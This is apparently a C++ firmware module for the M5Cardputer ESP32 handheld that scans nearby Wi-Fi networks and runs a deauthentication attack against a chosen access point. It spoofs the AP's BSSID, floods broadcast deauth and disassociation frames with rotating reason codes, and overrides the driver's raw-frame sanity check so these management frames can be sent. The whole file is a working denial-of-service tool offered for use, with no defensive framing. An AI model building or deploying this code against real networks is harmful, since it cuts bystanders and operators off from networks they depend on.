#pragma once
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include "../main_menu.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

class WifiModule {
public:
    static constexpr int MAX_APS = 24;

    struct ApEntry {
        char ssid[33];
        uint8_t bssid[6];
        int32_t rssi;
        uint8_t channel;
    };

    void enter() {
        jamming_ = false;
        selectedIdx_ = 0;
        apCount_ = 0;
        txPackets_ = 0;
        scanNetworks();
        draw();
    }

    bool update(const NavInput& nav) {
        if (nav.back) {
            stopJamming();
            return true;
        }

        if (jamming_) {
            if (nav.select) {
                stopJamming();
                draw();
            } else {
                stepJam();
            }
            return false;
        }

        if (apCount_ > 0) {
            if (nav.up) {
                selectedIdx_ = (selectedIdx_ - 1 + apCount_) % apCount_;
                draw();
            }
            if (nav.down) {
                selectedIdx_ = (selectedIdx_ + 1) % apCount_;
                draw();
            }
            if (nav.select) {
                startJamming();
                draw();
            }
        } else if (nav.select) {
            scanNetworks();
            draw();
        }

        return false;
    }

private:
    ApEntry aps_[MAX_APS];
    int apCount_ = 0;
    int selectedIdx_ = 0;
    bool jamming_ = false;
    uint32_t txPackets_ = 0;
    uint8_t reasonIdx_ = 0;
    unsigned long lastSendMs_ = 0;
    unsigned long lastUiMs_ = 0;

    static const uint8_t DEAUTH_REASONS[];
    static const int DEAUTH_REASON_COUNT;

    void scanNetworks() {
        auto& d = M5Cardputer.Display;
        d.fillScreen(THEME_BG);
        d.setTextColor(THEME_FG, THEME_BG);
        d.setTextSize(2);
        d.setCursor(12, 48);
        d.print("Scanning Wi-Fi...");

        WiFi.mode(WIFI_STA);
        WiFi.disconnect(false, true);
        delay(80);

        int found = WiFi.scanNetworks(false, true);
        apCount_ = (found > MAX_APS) ? MAX_APS : ((found > 0) ? found : 0);
        selectedIdx_ = 0;

        for (int i = 0; i < apCount_; ++i) {
            String s = WiFi.SSID(i);
            if (s.length() == 0) {
                snprintf(aps_[i].ssid, sizeof(aps_[i].ssid), "<Hidden>");
            } else {
                s.toCharArray(aps_[i].ssid, sizeof(aps_[i].ssid));
            }

            uint8_t* mac = WiFi.BSSID(static_cast<uint8_t>(i));
            if (mac) {
                memcpy(aps_[i].bssid, mac, 6);
            } else {
                memset(aps_[i].bssid, 0xFF, 6);
            }

            aps_[i].rssi = WiFi.RSSI(static_cast<uint8_t>(i));
            aps_[i].channel = static_cast<uint8_t>(WiFi.channel(static_cast<uint8_t>(i)));
        }

        WiFi.scanDelete();
    }

    void startJamming() {
        if (apCount_ <= 0) return;
        const ApEntry& target = aps_[selectedIdx_];

        WiFi.mode(WIFI_STA);
        WiFi.disconnect(false, true);
        delay(20);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);

        txPackets_ = 0;
        reasonIdx_ = 0;
        lastSendMs_ = 0;
        lastUiMs_ = 0;
        jamming_ = true;
    }

    void stopJamming() {
        if (!jamming_) return;
        jamming_ = false;
        esp_wifi_set_promiscuous(false);
    }

    void buildDeauthFrame(uint8_t* frame, const uint8_t* dest, const uint8_t* src,
                          const uint8_t* bssid, uint8_t reason, bool isDisassoc) {
        frame[0] = isDisassoc ? 0xA0 : 0xC0;
        frame[1] = 0x00;
        frame[2] = 0x3A;
        frame[3] = 0x01;
        memcpy(&frame[4], dest, 6);
        memcpy(&frame[10], src, 6);
        memcpy(&frame[16], bssid, 6);

        uint16_t seq = static_cast<uint16_t>(random(0, 4096));
        frame[22] = static_cast<uint8_t>((seq >> 4) & 0xFF);
        frame[23] = static_cast<uint8_t>((seq & 0x0F) << 4);
        frame[24] = reason;
        frame[25] = 0x00;
    }

    void sendRawFrame(const uint8_t* frame, size_t len) {
        for (int i = 0; i < 3; ++i) {
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK) {
                txPackets_++;
            }
        }
    }

    void stepJam() {
        if (apCount_ <= 0) return;
        unsigned long now = millis();
        if (now - lastSendMs_ < 12) {
            return;
        }
        lastSendMs_ = now;

        const ApEntry& ap = aps_[selectedIdx_];
        static const uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t reason = DEAUTH_REASONS[reasonIdx_];
        reasonIdx_ = static_cast<uint8_t>((reasonIdx_ + 1) % DEAUTH_REASON_COUNT);

        uint8_t deauthFrame[26];
        uint8_t disassocFrame[26];
        buildDeauthFrame(deauthFrame, broadcastMac, ap.bssid, ap.bssid, reason, false);
        buildDeauthFrame(disassocFrame, broadcastMac, ap.bssid, ap.bssid, reason, true);

        sendRawFrame(deauthFrame, sizeof(deauthFrame));
        sendRawFrame(disassocFrame, sizeof(disassocFrame));

        if (now - lastUiMs_ >= 150) {
            lastUiMs_ = now;
            auto& d = M5Cardputer.Display;
            d.setTextSize(1);
            d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
            d.setCursor(16, 86);
            d.printf("Pkts sent: %lu   ", static_cast<unsigned long>(txPackets_));
        }
    }

    void draw() {
        auto& d = M5Cardputer.Display;
        d.fillScreen(THEME_BG);
        d.setTextColor(THEME_FG, THEME_BG);

        if (apCount_ == 0) {
            d.setTextSize(2);
            d.setCursor(12, 24);
            d.print("No Wi-Fi found");
            d.setTextSize(1);
            d.setCursor(12, 60);
            d.print("Enter: Rescan | `/Bksp: Back");
            return;
        }

        if (jamming_) {
            const ApEntry& ap = aps_[selectedIdx_];
            d.fillRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_HIGHLIGHT);
            d.drawRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_BORDER);
            d.setTextColor(THEME_FG, THEME_HIGHLIGHT);

            d.setTextSize(2);
            d.setCursor(16, 16);
            d.print("JAMMING ACTIVE");

            d.setCursor(16, 44);
            d.printf("%.14s", ap.ssid);

            d.setTextSize(1);
            d.setCursor(16, 70);
            d.printf("CH: %d  RSSI: %ld dBm", ap.channel, static_cast<long>(ap.rssi));

            d.setCursor(16, 86);
            d.printf("Pkts sent: %lu", static_cast<unsigned long>(txPackets_));

            d.setCursor(16, 108);
            d.print("Enter: Stop Jam | `/Bksp: Back");
            return;
        }

        const int visibleRows = 4;
        int startIdx = 0;
        if (selectedIdx_ >= visibleRows) {
            startIdx = selectedIdx_ - visibleRows + 1;
        }

        d.setTextSize(2);
        for (int row = 0; row < visibleRows; ++row) {
            int idx = startIdx + row;
            if (idx >= apCount_) break;

            int y = 6 + row * 28;
            bool sel = (idx == selectedIdx_);

            if (sel) {
                d.fillRoundRect(8, y, d.width() - 16, 25, 4, THEME_HIGHLIGHT);
                d.drawRoundRect(8, y, d.width() - 16, 25, 4, THEME_BORDER);
                d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
            } else {
                d.setTextColor(THEME_FG, THEME_BG);
            }

            d.setCursor(12, y + 5);
            d.print(sel ? "> " : "  ");
            d.printf("%.13s", aps_[idx].ssid);
        }

        d.setTextSize(1);
        d.setTextColor(THEME_FG, THEME_BG);
        d.setCursor(10, 122);
        d.printf("CH:%d %lddBm | Enter:Jam `/Bksp:Back",
                 aps_[selectedIdx_].channel,
                 static_cast<long>(aps_[selectedIdx_].rssi));
    }
};

const uint8_t WifiModule::DEAUTH_REASONS[] = {
    0x01, 0x04, 0x06, 0x07, 0x08, 0x0A, 0x0D, 0x0F
};
const int WifiModule::DEAUTH_REASON_COUNT =
    sizeof(WifiModule::DEAUTH_REASONS) / sizeof(WifiModule::DEAUTH_REASONS[0]);
